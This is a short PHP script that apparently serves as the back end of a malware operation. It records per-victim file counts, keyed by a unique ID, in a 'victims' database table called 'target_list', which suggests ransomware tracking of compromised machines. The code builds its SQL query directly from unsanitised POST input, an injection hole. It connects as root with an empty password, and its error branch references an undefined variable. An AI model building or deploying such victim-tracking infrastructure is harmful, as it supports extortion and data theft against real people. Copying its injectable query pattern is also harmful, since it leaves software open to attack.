<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$fileCount = $_POST['fileCount'];
$uniqueId = $_POST['uniqueId'];

if (isset($uniqueId) && !empty($uniqueId)) {
   if ($fileCount > 0) {
      $sql = "UPDATE target_list SET file_count = $fileCount where unique_id = \"$uniqueId\"";

      if ($conn->query($sql) === TRUE) {
         echo "File Count Received";
      } else {
         echo "Error: " . $sqlStmt . "<br>" . $conn->error;
      }
   }
} else {
   echo "Please supply the file count!";
}

$conn->close();

?>
